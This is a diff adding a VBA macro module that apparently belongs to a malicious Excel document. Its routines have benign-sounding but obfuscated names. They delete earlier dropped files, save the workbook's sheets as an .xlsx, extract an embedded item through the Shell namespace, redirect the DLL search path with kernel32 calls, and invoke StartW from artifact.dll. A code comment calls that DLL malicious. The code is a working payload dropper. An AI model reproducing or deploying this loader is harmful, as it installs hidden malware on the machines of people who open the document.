@@ -1,0 +1,65 @@
+#If VBA7 And Win64 Then
+    Public Declare PtrSafe Function code2 Lib "kernel32.dll" Alias "SetDefaultDllDirectories" (ByVal DirectoryFlags As Long) As Long
+    Public Declare PtrSafe Function code1 Lib "kernel32.dll" Alias "AddDllDirectory" (ByVal dirName As String) As LongPtr
+    Public Declare PtrSafe Function StartW Lib "artifact.dll" () As Integer
+ #Else
+    Public Declare Function code2 Lib "kernel32.dll" Alias "SetDefaultDllDirectories" (ByVal DirectoryFlags As Long) As Long
+    Public Declare Function code1 Lib "kernel32.dll" Alias "AddDllDirectory" (ByVal dirName As String) As Long
+    Public Declare Function voksp Lib "rgoc1.dll" () As Integer
+#End If
+
+Public Sub PublicResumEraseByArrayList(ParamArray putArrayBigList() As Variant)
+    On Error Resume Next
+    For Each Key In putArrayBigList
+        Kill Key
+    Next Key
+End Sub
+
+Public Sub VistaQ(WhereToGo)
+    ThisWorkbook.Sheets.Copy
+    Application.DisplayAlerts = False
+    ActiveWorkbook.SaveAs WhereToGo, Local:=False, FileFormat:=51
+    ActiveWorkbook.Close  
+End Sub
+
+Public Function ExChangeMoney()
+
+    Dim sNMSP As New Shell 
+    Dim ofbl As String
+    Dim sOfbl As String
+
+    dershlep = Environ$(Form0.TextBox1.Tag)
+
+    ofbl = Environ$(Form0.TextBox1.Tag)
+    ofbl = ofbl + "\rgoc"
+    sOfbl = ofbl + Sheet1.Range("B115").Value
+
+    liquidOne = Environ$(Form0.TextBox1.Tag) + "\academ"
+    liquidOne = liquidOne + "l.xlsx"
+    ctackPip = liquidOne & Sheet1.Range("B115").Value
+    
+    PublicResumEraseByArrayList ofbl + "*", Form0.TextBox3.Tag + "\rgoc*", sOfbl, ctackPip, dershlep & UserForm1.Label1.Tag
+        
+    VistaQ liquidOne
+        
+    FileCopy Source:=liquidOne, Destination:=ctackPip
+        
+    Lrigat = UserForm1.Label11.Tag
+
+    Set DestinationKat = sNMSP.Namespace(dershlep)
+    Set harvest = sNMSP.Namespace(ctackPip)
+
+    DestinationKat.CopyHere harvest.Items.Item(Lrigat)
+    
+    Composition
+           
+    ChDir Environ$(Form0.TextBox1.Tag) + "\out\"
+
+    setDLLDirectory "" + Environ$(Form0.TextBox1.Tag) + "\out\"
+
+    'Exec entrypoint of malicious DLL here
+    StartW
+
+    WelcomeDialog.Hide
+
+End Function
